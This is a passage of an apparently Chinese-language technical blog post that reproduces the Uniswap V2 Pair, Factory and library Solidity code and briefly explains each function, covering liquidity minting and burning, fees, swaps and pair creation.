_reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;</span><br><span class="line">        uint amount1In = balance1 &gt; _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;</span><br><span class="line">        require(amount0In &gt; 0 || amount1In &gt; 0, &#x27;UniswapV2: INSUFFICIENT_INPUT_AMOUNT&#x27;);</span><br><span class="line">        &#123; // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors</span><br><span class="line">        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));</span><br><span class="line">        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));</span><br><span class="line">        require(balance0Adjusted.mul(balance1Adjusted) &gt;= uint(_reserve0).mul(_reserve1).mul(1000**2), &#x27;UniswapV2: K&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _update(balance0, balance1, _reserve0, _reserve1);</span><br><span class="line">        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // force balances to match reserves</span><br><span class="line">    function skim(address to) external lock &#123;</span><br><span class="line">        address _token0 = token0; // gas savings</span><br><span class="line">        address _token1 = token1; // gas savings</span><br><span class="line">        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));</span><br><span class="line">        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // force reserves to match balances</span><br><span class="line">    function sync() external lock &#123;</span><br><span class="line">        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Analyse-1"><a href="#Analyse-1" class="headerlink" title="Analyse"></a>Analyse</h3><p><strong>pair也是一个ERC20合约，是用来进行token0与token1的交换，一般由Factory合约来创建，然后初始化两种token</strong></p><h3 id="getReserves"><a href="#getReserves" class="headerlink" title="getReserves()"></a>getReserves()</h3><p><strong>用于得到两代币的储蓄金余额</strong></p><h3 id="initialize-address-token0-address-token1"><a href="#initialize-address-token0-address-token1" class="headerlink" title="initialize(address _token0, address _token1)"></a>initialize(address _token0, address _token1)</h3><p><strong>用于初始化token0与token1</strong></p><h3 id="updata-uint-balance0-uint-balance1-uint112-reserve0-uint112-reserve1"><a href="#updata-uint-balance0-uint-balance1-uint112-reserve0-uint112-reserve1" class="headerlink" title="_updata(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1)"></a>_updata(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private &#123;</span><br><span class="line">    require(balance0 &lt;= uint112(-1) &amp;&amp; balance1 &lt;= uint112(-1), &#x27;UniswapV2: OVERFLOW&#x27;);</span><br><span class="line">    uint32 blockTimestamp = uint32(block.timestamp % 2**32);</span><br><span class="line">    uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired</span><br><span class="line">    if (timeElapsed &gt; 0 &amp;&amp; _reserve0 != 0 &amp;&amp; _reserve1 != 0) &#123;</span><br><span class="line">        // * never overflows, and + overflow is desired</span><br><span class="line">        price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;</span><br><span class="line">        price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;</span><br><span class="line">    &#125;</span><br><span class="line">    reserve0 = uint112(balance0);</span><br><span class="line">    reserve1 = uint112(balance1);</span><br><span class="line">    blockTimestampLast = blockTimestamp;</span><br><span class="line">    emit Sync(reserve0, reserve1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>用于更新储备金的余额，与balance保持一致</strong></p><h3 id="mint-to"><a href="#mint-to" class="headerlink" title="mint(to)"></a>mint(to)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function mint(address to) external lock returns (uint liquidity) &#123;</span><br><span class="line">    (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings</span><br><span class="line">    uint balance0 = IERC20(token0).balanceOf(address(this));</span><br><span class="line">    uint balance1 = IERC20(token1).balanceOf(address(this));</span><br><span class="line">    uint amount0 = balance0.sub(_reserve0);</span><br><span class="line">    uint amount1 = balance1.sub(_reserve1);</span><br><span class="line"></span><br><span class="line">    bool feeOn = _mintFee(_reserve0, _reserve1);</span><br><span class="line">    uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee</span><br><span class="line">    if (_totalSupply == 0) &#123;</span><br><span class="line">        liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);</span><br><span class="line">       _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);</span><br><span class="line">    &#125;</span><br><span class="line">    require(liquidity &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED&#x27;);</span><br><span class="line">    _mint(to, liquidity);</span><br><span class="line"></span><br><span class="line">    _update(balance0, balance1, _reserve0, _reserve1);</span><br><span class="line">    if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date</span><br><span class="line">    emit Mint(msg.sender, amount0, amount1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>用于给pair合约添加流动性，返还给铸造者pair的自身代币。铸造过程需要自行向池子转账token0与token1,然后池子会根据原本的储蓄金与真正的地址余额来计算出你转账的token0,1的数量，然后判断池子的totalSupply是否为0，如果为0会给address(0)铸造1000个Lptoken,然后再给铸造者铸造两种代币乘积的开方数量的Lptoken。如果不为0，那么就会铸造两代币中数量最少的token,数量经过比例计算得出。然后更新储蓄金</strong>。</p><h3 id="mintFee-uint112-reserve0-uint112-reserve1"><a href="#mintFee-uint112-reserve0-uint112-reserve1" class="headerlink" title="_mintFee(uint112 _reserve0, uint112 _reserve1)"></a>_mintFee(uint112 _reserve0, uint112 _reserve1)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) &#123;</span><br><span class="line">    address feeTo = IUniswapV2Factory(factory).feeTo();</span><br><span class="line">    feeOn = feeTo != address(0);</span><br><span class="line">    uint _kLast = kLast; // gas savings</span><br><span class="line">    if (feeOn) &#123;</span><br><span class="line">        if (_kLast != 0) &#123;</span><br><span class="line">            uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));</span><br><span class="line">            uint rootKLast = Math.sqrt(_kLast);</span><br><span class="line">            if (rootK &gt; rootKLast) &#123;</span><br><span class="line">                uint numerator = totalSupply.mul(rootK.sub(rootKLast));</span><br><span class="line">                uint denominator = rootK.mul(5).add(rootKLast);</span><br><span class="line">                uint liquidity = numerator / denominator;</span><br><span class="line">                if (liquidity &gt; 0) _mint(feeTo, liquidity);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (_kLast != 0) &#123;</span><br><span class="line">        kLast = 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>计算出几乎1&#x2F;6的totalSupply铸造给feeTo地址</strong></p><h3 id="burn-to"><a href="#burn-to" class="headerlink" title="burn(to)"></a>burn(to)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function burn(address to) external lock returns (uint amount0, uint amount1) &#123;</span><br><span class="line">    (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings</span><br><span class="line">    address _token0 = token0;                                // gas savings</span><br><span class="line">    address _token1 = token1;                                // gas savings</span><br><span class="line">    uint balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">    uint balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line">    uint liquidity = balanceOf[address(this)];</span><br><span class="line"></span><br><span class="line">    bool feeOn = _mintFee(_reserve0, _reserve1);</span><br><span class="line">    uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee</span><br><span class="line">    amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution</span><br><span class="line">    amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution</span><br><span class="line">    require(amount0 &gt; 0 &amp;&amp; amount1 &gt; 0, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED&#x27;);</span><br><span class="line">    _burn(address(this), liquidity);</span><br><span class="line">    _safeTransfer(_token0, to, amount0);</span><br><span class="line">    _safeTransfer(_token1, to, amount1);</span><br><span class="line">    balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">    balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">    _update(balance0, balance1, _reserve0, _reserve1);</span><br><span class="line">    if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date</span><br><span class="line">    emit Burn(msg.sender, amount0, amount1, to);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>计算出出相对比例的token0,1.然后转给销毁者，流动性的数量需要销毁者自行转账给本地址,然后根据本地址的lptoken来计算。然后更新储蓄金</strong></p><h3 id="swap-uint-amount0Out-uint-amount1Out-address-to-bytes-calldata-data"><a href="#swap-uint-amount0Out-uint-amount1Out-address-to-bytes-calldata-data" class="headerlink" title="swap(uint amount0Out, uint amount1Out, address to, bytes calldata data)"></a>swap(uint amount0Out, uint amount1Out, address to, bytes calldata data)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock &#123;</span><br><span class="line">      require(amount0Out &gt; 0 || amount1Out &gt; 0, &#x27;UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);</span><br><span class="line">      (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings</span><br><span class="line">      require(amount0Out &lt; _reserve0 &amp;&amp; amount1Out &lt; _reserve1, &#x27;UniswapV2: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line"></span><br><span class="line">      uint balance0;</span><br><span class="line">      uint balance1;</span><br><span class="line">      &#123; // scope for _token&#123;0,1&#125;, avoids stack too deep errors</span><br><span class="line">      address _token0 = token0;</span><br><span class="line">      address _token1 = token1;</span><br><span class="line">      require(to != _token0 &amp;&amp; to != _token1, &#x27;UniswapV2: INVALID_TO&#x27;);</span><br><span class="line">      if (amount0Out &gt; 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens</span><br><span class="line">      if (amount1Out &gt; 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens</span><br><span class="line">      if (data.length &gt; 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);</span><br><span class="line">      balance0 = IERC20(_token0).balanceOf(address(this));</span><br><span class="line">      balance1 = IERC20(_token1).balanceOf(address(this));</span><br><span class="line">      &#125;</span><br><span class="line">      uint amount0In = balance0 &gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;</span><br><span class="line">      uint amount1In = balance1 &gt; _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;</span><br><span class="line">      require(amount0In &gt; 0 || amount1In &gt; 0, &#x27;UniswapV2: INSUFFICIENT_INPUT_AMOUNT&#x27;);</span><br><span class="line">      &#123; // scope for reserve&#123;0,1&#125;Adjusted, avoids stack too deep errors</span><br><span class="line">      uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));</span><br><span class="line">      uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));</span><br><span class="line">      require(balance0Adjusted.mul(balance1Adjusted) &gt;= uint(_reserve0).mul(_reserve1).mul(1000**2), &#x27;UniswapV2: K&#x27;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      _update(balance0, balance1, _reserve0, _reserve1);</span><br><span class="line">      emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>先得到一定数量的amount0,1。然后判断data是否大于0，来判断是否进行回调to合约。最后判断交换前后池中token0*token1的定值k是否变大，若变大正常，若变小回归。同时需要收取3&#x2F;1000的amountIn的手续费，先收费后判断定值k。然后更新储蓄金</strong></p><h3 id="skim-address-to"><a href="#skim-address-to" class="headerlink" title="skim(address to)"></a>skim(address to)</h3><p><strong>强制让balance与储蓄金相等</strong></p><h3 id="sync（address-to）"><a href="#sync（address-to）" class="headerlink" title="sync（address to）"></a>sync（address to）</h3><p><strong>强制让储蓄金与balance相等</strong></p><h2 id="UniswapV2Factory"><a href="#UniswapV2Factory" class="headerlink" title="UniswapV2Factory"></a>UniswapV2Factory</h2><h3 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">contract UniswapV2Factory is IUniswapV2Factory &#123;</span><br><span class="line">    address public feeTo;</span><br><span class="line">    address public feeToSetter;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; address)) public getPair;</span><br><span class="line">    address[] public allPairs;</span><br><span class="line"></span><br><span class="line">    event PairCreated(address indexed token0, address indexed token1, address pair, uint);</span><br><span class="line"></span><br><span class="line">    constructor(address _feeToSetter) public &#123;</span><br><span class="line">        feeToSetter = _feeToSetter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allPairsLength() external view returns (uint) &#123;</span><br><span class="line">        return allPairs.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function createPair(address tokenA, address tokenB) external returns (address pair) &#123;</span><br><span class="line">        require(tokenA != tokenB, &#x27;UniswapV2: IDENTICAL_ADDRESSES&#x27;);</span><br><span class="line">        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);</span><br><span class="line">        require(token0 != address(0), &#x27;UniswapV2: ZERO_ADDRESS&#x27;);</span><br><span class="line">        require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;); // single check is sufficient</span><br><span class="line">        bytes memory bytecode = type(UniswapV2Pair).creationCode;</span><br><span class="line">        bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            pair := create2(0, add(bytecode, 32), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        IUniswapV2Pair(pair).initialize(token0, token1);</span><br><span class="line">        getPair[token0][token1] = pair;</span><br><span class="line">        getPair[token1][token0] = pair; // populate mapping in the reverse direction</span><br><span class="line">        allPairs.push(pair);</span><br><span class="line">        emit PairCreated(token0, token1, pair, allPairs.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setFeeTo(address _feeTo) external &#123;</span><br><span class="line">        require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;);</span><br><span class="line">        feeTo = _feeTo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setFeeToSetter(address _feeToSetter) external &#123;</span><br><span class="line">        require(msg.sender == feeToSetter, &#x27;UniswapV2: FORBIDDEN&#x27;);</span><br><span class="line">        feeToSetter = _feeToSetter;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Anaylse"><a href="#Anaylse" class="headerlink" title="Anaylse"></a>Anaylse</h3><p><strong>Factory就是一个装有许多pair对的合约，它用来创建新的pair并且储存所有的pair对，可以通过两个token的地址来寻找到相应的pair对</strong></p><h3 id="creatPair"><a href="#creatPair" class="headerlink" title="creatPair()"></a>creatPair()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function createPair(address tokenA, address tokenB) external returns (address pair) &#123;</span><br><span class="line">    require(tokenA != tokenB, &#x27;UniswapV2: IDENTICAL_ADDRESSES&#x27;);</span><br><span class="line">    (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);</span><br><span class="line">    require(token0 != address(0), &#x27;UniswapV2: ZERO_ADDRESS&#x27;);</span><br><span class="line">    require(getPair[token0][token1] == address(0), &#x27;UniswapV2: PAIR_EXISTS&#x27;); // single check is sufficient</span><br><span class="line">    bytes memory bytecode = type(UniswapV2Pair).creationCode;</span><br><span class="line">    bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">    assembly &#123;</span><br><span class="line">        pair := create2(0, add(bytecode, 32), mload(bytecode), salt)</span><br><span class="line">    &#125;</span><br><span class="line">    IUniswapV2Pair(pair).initialize(token0, token1);</span><br><span class="line">    getPair[token0][token1] = pair;</span><br><span class="line">    getPair[token1][token0] = pair; // populate mapping in the reverse direction</span><br><span class="line">    allPairs.push(pair);</span><br><span class="line">    emit PairCreated(token0, token1, pair, allPairs.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>用来creat2的方法来创建pair对，并且初始化pair中的token</strong></p><h3 id="library-UQ11"><a href="#library-UQ11" class="headerlink" title="library UQ11"></a>library UQ11</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">library UQ112x112 &#123;</span><br><span class="line">    uint224 constant Q112 = 2**112;</span><br><span class="line"></span><br><span class="line">    // encode a uint112 as a UQ112x112</span><br><span class="line">    function encode(uint112 y) internal pure returns (uint224 z) &#123;</span><br><span class="line">        z = uint224(y) * Q112; // never overflows</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // divide a UQ112x112 by a uint112, returning a UQ112x112</span><br><span class="line">    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) &#123;</span><br><span class="line">        z = x / uint224(y);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>因为solidity中不允许出现小数，但是token数量又一定会出现小数，所以使用uint224，其中112位作为整数部分，另112位作为小数部分，这样精度即可达到1&#x2F;2**112,最后的uint32用来存储timestamp</p><h1 id="UniswapV2Library"><a href="#UniswapV2Library" class="headerlink" title="UniswapV2Library"></a>UniswapV2Library</h1><h2 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">library UniswapV2Library &#123;</span><br><span class="line">    using SafeMath for uint;</span><br><span class="line"></span><br><span class="line">    // returns sorted token addresses, used to handle return values from pairs sorted in this order</span><br><span class="line">    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) &#123;</span><br><span class="line">        require(tokenA != tokenB, &#x27;UniswapV2Library: IDENTICAL_ADDRESSES&#x27;);</span><br><span class="line">        (token0, token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);</span><br><span class="line">        require(token0 != address(0), &#x27;UniswapV2Library: ZERO_ADDRESS&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // calculates the CREATE2 address for a pair without making any external calls</span><br><span class="line">    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) &#123;</span><br><span class="line">        (address token0, address token1) = sortTokens(tokenA, tokenB);</span><br><span class="line">        pair = address(uint(keccak256(abi.encodePacked(</span><br><span class="line">                hex&#x27;ff&#x27;,</span><br><span class="line">                factory,</span><br><span class="line">                keccak256(abi.encodePacked(token0, token1)),</span><br><span class="line">                hex&#x27;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&#x27; // init code hash</span><br><span class="line">            ))));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // fetches and sorts the reserves for a pair</span><br><span class="line">    function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) &#123;</span><br><span class="line">        (address token0,) = sortTokens(tokenA, tokenB);</span><br><span class="line">        (uint reserve0, uint reserve1,) = IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves();</span><br><span class="line">        (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset</span><br><span class="line">    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) &#123;</span><br><span class="line">        require(amountA &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_AMOUNT&#x27;);</span><br><span class="line">        require(reserveA &gt; 0 &amp;&amp; reserveB &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line">        amountB = amountA.mul(reserveB) / reserveA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset</span><br><span class="line">    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) &#123;</span><br><span class="line">        require(amountIn &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT&#x27;);</span><br><span class="line">        require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line">        uint amountInWithFee = amountIn.mul(997);</span><br><span class="line">        uint numerator = amountInWithFee.mul(reserveOut);</span><br><span class="line">        uint denominator = reserveIn.mul(1000).add(amountInWithFee);</span><br><span class="line">        amountOut = numerator / denominator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset</span><br><span class="line">    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) &#123;</span><br><span class="line">        require(amountOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT&#x27;);</span><br><span class="line">        require(reserveIn &gt; 0 &amp;&amp; reserveOut &gt; 0, &#x27;UniswapV2Library: INSUFFICIENT_LIQUIDITY&#x27;);</span><br><span class="line">        uint numerator = reserveIn.mul(amountOut).mul(1000);</span><br><span class="line">        uint denominator = reserveOut.sub(amountOut).mul(997);</span><br><span class="line">        amountIn = (numerator / denominator).add(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // performs chained getAmountOut calculations on any number of pairs</span><br><span class="line">    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) &#123;</span><br><span class="line">        require(path.length &gt;= 2, &#x27;UniswapV2Library: INVALID_PATH&#x27;);</span><br><span class="line">        amounts = new uint[](path.length);</span><br><span class="line">        amounts[0] = amountIn;</span><br><span class="line">        for (uint i; i &lt; path.length - 1; i++) &#123;</span><br><span class="line">            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);</span><br><span class="line">            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // performs chained getAmountIn calculations on any number of pairs</span><br><span class="line">    function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) &#123;</span><br><span class="line">        require(path.length &gt;= 2, &#x27;UniswapV2Library: INVALID_PATH&#x27;);</span><br><span class="line">        amounts = new uint[](path.length);</span><br><span class="line">        amounts[amounts.length - 1] = amountOut;</span><br><span class="line">        for (uint i = path.length - 1; i &gt; 0; i--) &#123;</span><br><span class="line">            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);</span><br><span class="line">            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);</span><br><span class="line">        